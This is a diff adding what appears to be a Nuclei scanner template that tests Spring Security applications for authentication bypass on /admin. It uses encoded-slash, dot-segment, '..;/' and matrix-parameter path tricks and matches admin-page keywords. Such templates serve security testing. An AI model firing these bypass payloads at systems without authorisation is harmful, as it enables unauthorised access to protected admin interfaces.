@@ -1,0 +1,34 @@
+id: spring-security-bypass
+
+info:
+  name: Spring Security Authentication Bypass
+  author: security-team
+  severity: high
+  description: Attempts to bypass Spring Security authentication
+  tags: spring-security,bypass,auth,java
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/admin/"
+      - "{{BaseURL}}/admin;jsessionid=test"
+      - "{{BaseURL}}/admin/."
+      - "{{BaseURL}}/admin/./"
+      - "{{BaseURL}}/admin/..;/admin"
+      - "{{BaseURL}}/./admin"
+      - "{{BaseURL}}//admin"
+      - "{{BaseURL}}/admin%2f"
+      - "{{BaseURL}}/admin%252f"
+      
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - "admin panel"
+          - "dashboard"
+          - "management console"
+          - "welcome admin"
+        case-insensitive: true
+        part: body
+        condition: or
